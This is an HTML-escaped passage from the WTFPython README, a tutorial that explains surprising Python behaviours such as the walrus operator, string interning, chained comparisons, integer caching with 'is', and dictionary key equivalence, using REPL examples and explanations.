&lt;ul&gt; &#xA;  &lt;li&gt;Brief explanation of what&#39;s happening and why is it happening.&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Set up code&#xA;# More examples for further clarification (if necessary)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;&lt;strong&gt;Output (Python version(s)):&lt;/strong&gt;&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; trigger # some example that makes it easy to unveil the magic&#xA;# some justified output&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; All the examples are tested on Python 3.5.2 interactive interpreter, and they should work for all the Python versions unless explicitly specified before the output.&lt;/p&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;p&gt;A nice way to get the most out of these examples, in my opinion, is to read them in sequential order, and for every example:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Carefully read the initial code for setting up the example. If you&#39;re an experienced Python programmer, you&#39;ll successfully anticipate what&#39;s going to happen next most of the time.&lt;/li&gt; &#xA; &lt;li&gt;Read the output snippets and, &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Check if the outputs are the same as you&#39;d expect.&lt;/li&gt; &#xA;   &lt;li&gt;Make sure if you know the exact reason behind the output being the way it is. &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;If the answer is no (which is perfectly okay), take a deep breath, and read the explanation (and if you still don&#39;t understand, shout out! and create an issue &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/new&#34;&gt;here&lt;/a&gt;).&lt;/li&gt; &#xA;     &lt;li&gt;If yes, give a gentle pat on your back, and you may skip to the next example.&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;PS: You can also read WTFPython at the command line using the &lt;a href=&#34;https://pypi.python.org/pypi/wtfpython&#34;&gt;pypi package&lt;/a&gt;,&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pip install wtfpython -U&#xA;$ wtfpython&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h1&gt;👀 Examples&lt;/h1&gt; &#xA;&lt;h2&gt;Section: Strain your brain!&lt;/h2&gt; &#xA;&lt;h3&gt;▶ First things first! *&lt;/h3&gt; &#xA;&lt;!-- Example ID: d3d73936-3cf1-4632-b5ab-817981338863 --&gt; &#xA;&lt;!-- read-only --&gt; &#xA;&lt;p&gt;For some reason, the Python 3.8&#39;s &#34;Walrus&#34; operator (&lt;code&gt;:=&lt;/code&gt;) has become quite popular. Let&#39;s check it out,&lt;/p&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Python version 3.8+&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = &#34;wtf_walrus&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;&#39;wtf_walrus&#39;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a := &#34;wtf_walrus&#34;&#xA;File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1&#xA;    a := &#34;wtf_walrus&#34;&#xA;      ^&#xA;SyntaxError: invalid syntax&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; (a := &#34;wtf_walrus&#34;) # This works though&#xA;&#39;wtf_walrus&#39;&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;&#39;wtf_walrus&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2 .&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Python version 3.8+&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = 6, 9&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;(6, 9)&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; (a := 6, 9)&#xA;(6, 9)&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;6&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a, b = 6, 9 # Typical unpacking&#xA;&amp;gt;&amp;gt;&amp;gt; a, b&#xA;(6, 9)&#xA;&amp;gt;&amp;gt;&amp;gt; (a, b = 16, 19) # Oops&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1&#xA;    (a, b = 16, 19)&#xA;          ^&#xA;SyntaxError: invalid syntax&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; (a, b := 16, 19) # This prints out a weird 3-tuple&#xA;(6, 16, 19)&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a # a is still unchanged?&#xA;6&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; b&#xA;16&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;Quick walrus operator refresher&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;The Walrus operator (&lt;code&gt;:=&lt;/code&gt;) was introduced in Python 3.8, it can be useful in situations where you&#39;d want to assign values to variables within an expression.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func():&#xA;        # Assume some expensive computation here&#xA;        # time.sleep(1000)&#xA;        return 5&#xA;&#xA;# So instead of,&#xA;if some_func():&#xA;        print(some_func()) # Which is bad practice since computation is happening twice&#xA;&#xA;# or&#xA;a = some_func()&#xA;if a:&#xA;    print(a)&#xA;&#xA;# Now you can concisely write&#xA;if a := some_func():&#xA;        print(a)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;gt; 3.8):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;5&#xA;5&#xA;5&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This saved one line of code, and implicitly prevented invoking &lt;code&gt;some_func&lt;/code&gt; twice.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Unparenthesized &#34;assignment expression&#34; (use of walrus operator), is restricted at the top level, hence the &lt;code&gt;SyntaxError&lt;/code&gt; in the &lt;code&gt;a := &#34;wtf_walrus&#34;&lt;/code&gt; statement of the first snippet. Parenthesizing it worked as expected and assigned &lt;code&gt;a&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;As usual, parenthesizing of an expression containing &lt;code&gt;=&lt;/code&gt; operator is not allowed. Hence the syntax error in &lt;code&gt;(a, b = 6, 9)&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The syntax of the Walrus operator is of the form &lt;code&gt;NAME:= expr&lt;/code&gt;, where &lt;code&gt;NAME&lt;/code&gt; is a valid identifier, and &lt;code&gt;expr&lt;/code&gt; is a valid expression. Hence, iterable packing and unpacking are not supported which means,&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt; &lt;p&gt;&lt;code&gt;(a := 6, 9)&lt;/code&gt; is equivalent to &lt;code&gt;((a := 6), 9)&lt;/code&gt; and ultimately &lt;code&gt;(a, 9) &lt;/code&gt; (where &lt;code&gt;a&lt;/code&gt;&#39;s value is 6&#39;)&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; (a := 6, 9) == ((a := 6), 9)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; x = (a := 696, 9)&#xA;&amp;gt;&amp;gt;&amp;gt; x&#xA;(696, 9)&#xA;&amp;gt;&amp;gt;&amp;gt; x[0] is a # Both reference same memory location&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;   &lt;li&gt; &lt;p&gt;Similarly, &lt;code&gt;(a, b := 16, 19)&lt;/code&gt; is equivalent to &lt;code&gt;(a, (b := 16), 19)&lt;/code&gt; which is nothing but a 3-tuple.&lt;/p&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Strings can be tricky sometimes&lt;/h3&gt; &#xA;&lt;!-- Example ID: 30f1d3fc-e267-4b30-84ef-4d9e7091ac1a ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = &#34;some_string&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; id(a)&#xA;140420665652016&#xA;&amp;gt;&amp;gt;&amp;gt; id(&#34;some&#34; + &#34;_&#34; + &#34;string&#34;) # Notice that both the ids are same.&#xA;140420665652016&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = &#34;wtf&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; b = &#34;wtf&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = &#34;wtf!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; b = &#34;wtf!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;False&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a, b = &#34;wtf!&#34;, &#34;wtf!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; a is b # All versions except 3.7.x&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = &#34;wtf!&#34;; b = &#34;wtf!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; a is b # This will print True or False depending on where you&#39;re invoking it (python shell / ipython / as a script)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# This time in file some_file.py&#xA;a = &#34;wtf!&#34;&#xA;b = &#34;wtf!&#34;&#xA;print(a is b)&#xA;&#xA;# prints True when the module is invoked!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;4.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;lt; Python3.7 )&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &#39;a&#39; * 20 is &#39;aaaaaaaaaaaaaaaaaaaa&#39;&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;a&#39; * 21 is &#39;aaaaaaaaaaaaaaaaaaaaa&#39;&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Makes sense, right?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The behavior in first and second snippets is due to a CPython optimization (called string interning) that tries to use existing immutable objects in some cases rather than creating a new object every time.&lt;/li&gt; &#xA; &lt;li&gt;After being &#34;interned,&#34; many variables may reference the same string object in memory (saving memory thereby).&lt;/li&gt; &#xA; &lt;li&gt;In the snippets above, strings are implicitly interned. The decision of when to implicitly intern a string is implementation-dependent. There are some rules that can be used to guess if a string will be interned or not: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;All length 0 and length 1 strings are interned.&lt;/li&gt; &#xA;   &lt;li&gt;Strings are interned at compile time (&lt;code&gt;&#39;wtf&#39;&lt;/code&gt; will be interned but &lt;code&gt;&#39;&#39;.join([&#39;w&#39;, &#39;t&#39;, &#39;f&#39;])&lt;/code&gt; will not be interned)&lt;/li&gt; &#xA;   &lt;li&gt;Strings that are not composed of ASCII letters, digits or underscores, are not interned. This explains why &lt;code&gt;&#39;wtf!&#39;&lt;/code&gt; was not interned due to &lt;code&gt;!&lt;/code&gt;. CPython implementation of this rule can be found &lt;a href=&#34;https://github.com/python/cpython/raw/3.6/Objects/codeobject.c#L19&#34;&gt;here&lt;/a&gt; &lt;img src=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/images/string-intern/string_intern.png&#34; alt=&#34;image&#34;&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;When &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; are set to &lt;code&gt;&#34;wtf!&#34;&lt;/code&gt; in the same line, the Python interpreter creates a new object, then references the second variable at the same time. If you do it on separate lines, it doesn&#39;t &#34;know&#34; that there&#39;s already &lt;code&gt;&#34;wtf!&#34;&lt;/code&gt; as an object (because &lt;code&gt;&#34;wtf!&#34;&lt;/code&gt; is not implicitly interned as per the facts mentioned above). It&#39;s a compile-time optimization. This optimization doesn&#39;t apply to 3.7.x versions of CPython (check this &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/100&#34;&gt;issue&lt;/a&gt; for more discussion).&lt;/li&gt; &#xA; &lt;li&gt;A compile unit in an interactive environment like IPython consists of a single statement, whereas it consists of the entire module in case of modules. &lt;code&gt;a, b = &#34;wtf!&#34;, &#34;wtf!&#34;&lt;/code&gt; is single statement, whereas &lt;code&gt;a = &#34;wtf!&#34;; b = &#34;wtf!&#34;&lt;/code&gt; are two statements in a single line. This explains why the identities are different in &lt;code&gt;a = &#34;wtf!&#34;; b = &#34;wtf!&#34;&lt;/code&gt;, and also explain why they are same when invoked in &lt;code&gt;some_file.py&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;The abrupt change in the output of the fourth snippet is due to a &lt;a href=&#34;https://en.wikipedia.org/wiki/Peephole_optimization&#34;&gt;peephole optimization&lt;/a&gt; technique known as Constant folding. This means the expression &lt;code&gt;&#39;a&#39;*20&lt;/code&gt; is replaced by &lt;code&gt;&#39;aaaaaaaaaaaaaaaaaaaa&#39;&lt;/code&gt; during compilation to save a few clock cycles during runtime. Constant folding only occurs for strings having a length of less than 21. (Why? Imagine the size of &lt;code&gt;.pyc&lt;/code&gt; file generated as a result of the expression &lt;code&gt;&#39;a&#39;*10**10&lt;/code&gt;). &lt;a href=&#34;https://github.com/python/cpython/raw/3.6/Python/peephole.c#L288&#34;&gt;Here&#39;s&lt;/a&gt; the implementation source for the same.&lt;/li&gt; &#xA; &lt;li&gt;Note: In Python 3.7, Constant folding was moved out from peephole optimizer to the new AST optimizer with some change in logic as well, so the fourth snippet doesn&#39;t work for Python 3.7. You can read more about the change &lt;a href=&#34;https://bugs.python.org/issue11549&#34;&gt;here&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Be careful with chained operations&lt;/h3&gt; &#xA;&lt;!-- Example ID: 07974979-9c86-4720-80bd-467aa19470d9 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; (False == False) in [False] # makes sense&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; False == (False in [False]) # makes sense&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; False == False in [False] # now what?&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; True is False == False&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; False is False is False&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; 1 &amp;gt; 0 &amp;lt; 1&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; (1 &amp;gt; 0) &amp;lt; 1&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; 1 &amp;gt; (0 &amp;lt; 1)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;p&gt;As per &lt;a href=&#34;https://docs.python.org/3/reference/expressions.html#membership-test-operations&#34;&gt;https://docs.python.org/3/reference/expressions.html#membership-test-operations&lt;/a&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Formally, if a, b, c, ..., y, z are expressions and op1, op2, ..., opN are comparison operators, then a op1 b op2 c ... y opN z is equivalent to a op1 b and b op2 c and ... y opN z, except that each expression is evaluated at most once.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;While such behavior might seem silly to you in the above examples, it&#39;s fantastic with stuff like &lt;code&gt;a == b == c&lt;/code&gt; and &lt;code&gt;0 &amp;lt;= x &amp;lt;= 100&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;False is False is False&lt;/code&gt; is equivalent to &lt;code&gt;(False is False) and (False is False)&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;True is False == False&lt;/code&gt; is equivalent to &lt;code&gt;True is False and False == False&lt;/code&gt; and since the first part of the statement (&lt;code&gt;True is False&lt;/code&gt;) evaluates to &lt;code&gt;False&lt;/code&gt;, the overall expression evaluates to &lt;code&gt;False&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;1 &amp;gt; 0 &amp;lt; 1&lt;/code&gt; is equivalent to &lt;code&gt;1 &amp;gt; 0 and 0 &amp;lt; 1&lt;/code&gt; which evaluates to &lt;code&gt;True&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;The expression &lt;code&gt;(1 &amp;gt; 0) &amp;lt; 1&lt;/code&gt; is equivalent to &lt;code&gt;True &amp;lt; 1&lt;/code&gt; and &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; int(True)&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; True + 1 #not relevant for this example, but just for fun&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; So, &lt;code&gt;1 &amp;lt; 1&lt;/code&gt; evaluates to &lt;code&gt;False&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ How not to use &lt;code&gt;is&lt;/code&gt; operator&lt;/h3&gt; &#xA;&lt;!-- Example ID: 230fa2ac-ab36-4ad1-b675-5f5a1c1a6217 ---&gt; &#xA;&lt;p&gt;The following is a very famous example present all over the internet.&lt;/p&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = 256&#xA;&amp;gt;&amp;gt;&amp;gt; b = 256&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = 257&#xA;&amp;gt;&amp;gt;&amp;gt; b = 257&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = []&#xA;&amp;gt;&amp;gt;&amp;gt; b = []&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;False&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; a = tuple()&#xA;&amp;gt;&amp;gt;&amp;gt; b = tuple()&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3. &lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a, b = 257, 257&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.7.x specifically)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a, b = 257, 257&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;The difference between &lt;code&gt;is&lt;/code&gt; and &lt;code&gt;==&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;is&lt;/code&gt; operator checks if both the operands refer to the same object (i.e., it checks if the identity of the operands matches or not).&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;==&lt;/code&gt; operator compares the values of both the operands and checks if they are the same.&lt;/li&gt; &#xA; &lt;li&gt;So &lt;code&gt;is&lt;/code&gt; is for reference equality and &lt;code&gt;==&lt;/code&gt; is for value equality. An example to clear things up, &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; class A: pass&#xA;&amp;gt;&amp;gt;&amp;gt; A() is A() # These are two empty objects at two different memory locations.&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;256&lt;/code&gt; is an existing object but &lt;code&gt;257&lt;/code&gt; isn&#39;t&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;When you start up python the numbers from &lt;code&gt;-5&lt;/code&gt; to &lt;code&gt;256&lt;/code&gt; will be allocated. These numbers are used a lot, so it makes sense just to have them ready.&lt;/p&gt; &#xA;&lt;p&gt;Quoting from &lt;a href=&#34;https://docs.python.org/3/c-api/long.html&#34;&gt;https://docs.python.org/3/c-api/long.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;The current implementation keeps an array of integer objects for all integers between -5 and 256, when you create an int in that range you just get back a reference to the existing object. So it should be possible to change the value of 1. I suspect the behavior of Python, in this case, is undefined. :-)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; id(256)&#xA;10922528&#xA;&amp;gt;&amp;gt;&amp;gt; a = 256&#xA;&amp;gt;&amp;gt;&amp;gt; b = 256&#xA;&amp;gt;&amp;gt;&amp;gt; id(a)&#xA;10922528&#xA;&amp;gt;&amp;gt;&amp;gt; id(b)&#xA;10922528&#xA;&amp;gt;&amp;gt;&amp;gt; id(257)&#xA;140084850247312&#xA;&amp;gt;&amp;gt;&amp;gt; x = 257&#xA;&amp;gt;&amp;gt;&amp;gt; y = 257&#xA;&amp;gt;&amp;gt;&amp;gt; id(x)&#xA;140084850247440&#xA;&amp;gt;&amp;gt;&amp;gt; id(y)&#xA;140084850247344&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Here the interpreter isn&#39;t smart enough while executing &lt;code&gt;y = 257&lt;/code&gt; to recognize that we&#39;ve already created an integer of the value &lt;code&gt;257,&lt;/code&gt; and so it goes on to create another object in the memory.&lt;/p&gt; &#xA;&lt;p&gt;Similar optimization applies to other &lt;strong&gt;immutable&lt;/strong&gt; objects like empty tuples as well. Since lists are mutable, that&#39;s why &lt;code&gt;[] is []&lt;/code&gt; will return &lt;code&gt;False&lt;/code&gt; and &lt;code&gt;() is ()&lt;/code&gt; will return &lt;code&gt;True&lt;/code&gt;. This explains our second snippet. Let&#39;s move on to the third one,&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Both &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; refer to the same object when initialized with same value in the same line.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a, b = 257, 257&#xA;&amp;gt;&amp;gt;&amp;gt; id(a)&#xA;140640774013296&#xA;&amp;gt;&amp;gt;&amp;gt; id(b)&#xA;140640774013296&#xA;&amp;gt;&amp;gt;&amp;gt; a = 257&#xA;&amp;gt;&amp;gt;&amp;gt; b = 257&#xA;&amp;gt;&amp;gt;&amp;gt; id(a)&#xA;140640774013392&#xA;&amp;gt;&amp;gt;&amp;gt; id(b)&#xA;140640774013488&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;When a and b are set to &lt;code&gt;257&lt;/code&gt; in the same line, the Python interpreter creates a new object, then references the second variable at the same time. If you do it on separate lines, it doesn&#39;t &#34;know&#34; that there&#39;s already &lt;code&gt;257&lt;/code&gt; as an object.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;It&#39;s a compiler optimization and specifically applies to the interactive environment. When you enter two lines in a live interpreter, they&#39;re compiled separately, therefore optimized separately. If you were to try this example in a &lt;code&gt;.py&lt;/code&gt; file, you would not see the same behavior, because the file is compiled all at once. This optimization is not limited to integers, it works for other immutable data types like strings (check the &#34;Strings are tricky example&#34;) and floats as well,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a, b = 257.0, 257.0&#xA;&amp;gt;&amp;gt;&amp;gt; a is b&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Why didn&#39;t this work for Python 3.7? The abstract reason is because such compiler optimizations are implementation specific (i.e. may change with version, OS, etc). I&#39;m still figuring out what exact implementation change cause the issue, you can check out this &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/100&#34;&gt;issue&lt;/a&gt; for updates.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Hash brownies&lt;/h3&gt; &#xA;&lt;!-- Example ID: eb17db53-49fd-4b61-85d6-345c5ca213ff ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_dict = {}&#xA;some_dict[5.5] = &#34;JavaScript&#34;&#xA;some_dict[5.0] = &#34;Ruby&#34;&#xA;some_dict[5] = &#34;Python&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_dict[5.5]&#xA;&#34;JavaScript&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[5.0] # &#34;Python&#34; destroyed the existence of &#34;Ruby&#34;?&#xA;&#34;Python&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[5] &#xA;&#34;Python&#34;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; complex_five = 5 + 0j&#xA;&amp;gt;&amp;gt;&amp;gt; type(complex_five)&#xA;complex&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[complex_five]&#xA;&#34;Python&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;So, why is Python all over the place?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Uniqueness of keys in a Python dictionary is by &lt;em&gt;equivalence&lt;/em&gt;, not identity. So even though &lt;code&gt;5&lt;/code&gt;, &lt;code&gt;5.0&lt;/code&gt;, and &lt;code&gt;5 + 0j&lt;/code&gt; are distinct objects of different types, since they&#39;re equal, they can&#39;t both be in the same &lt;code&gt;dict&lt;/code&gt; (or &lt;code&gt;set&lt;/code&gt;). As soon as you insert any one of them, attempting to look up any distinct but equivalent key will succeed with the original mapped value (rather than failing with a &lt;code&gt;KeyError&lt;/code&gt;):&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; 5 == 5.0 == 5 + 0j&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; 5 is not 5.0 is not 5 + 0j&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict = {}&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[5.0] = &#34;Ruby&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; 5.0 in some_dict&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; (5 in some_dict) and (5 + 0j in some_dict)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;This applies when setting an item as well. So when you do &lt;code&gt;some_dict[5] = &#34;Python&#34;&lt;/code&gt;, Python finds the existing item with equivalent key &lt;code&gt;5.0 -&amp;gt; &#34;Ruby&#34;&lt;/code&gt;, overwrites its value in place, and leaves the original key alone.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_dict&#xA;{5.0: 